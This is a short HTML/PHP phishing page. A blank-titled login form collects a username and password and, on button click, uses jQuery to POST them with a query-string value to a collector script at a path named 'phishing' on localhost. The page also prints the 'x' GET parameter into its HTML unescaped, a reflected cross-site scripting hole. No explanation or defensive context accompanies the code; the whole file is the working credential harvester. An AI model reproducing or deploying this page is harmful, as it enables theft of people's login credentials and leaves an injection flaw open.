<!DOCTYPE html>
<html>
<head>
<title></title>
</head>
<script type="text/javascript" src="jquery.js"></script>
<body>

<input id="name" placeholder="Username"  type="text"  />
<input type="password" placeholder="Password"  id="psd"  >
<button onclick="str()">Ok</button>
<span id="x"   style="display:none" ><?php echo $_GET["x"] ?></span>
<script type="text/javascript">

var x=document.getElementById("x").innerHTML;
function str(){
var n=$("#name").val();
var p=$("#psd").val();

var values="x="+x+"&user="+n+"&psd="+p;
$.post("http://localhost:8080/phishing/index.php",values ,function(data){

}
);}
</script>
</body>
</html>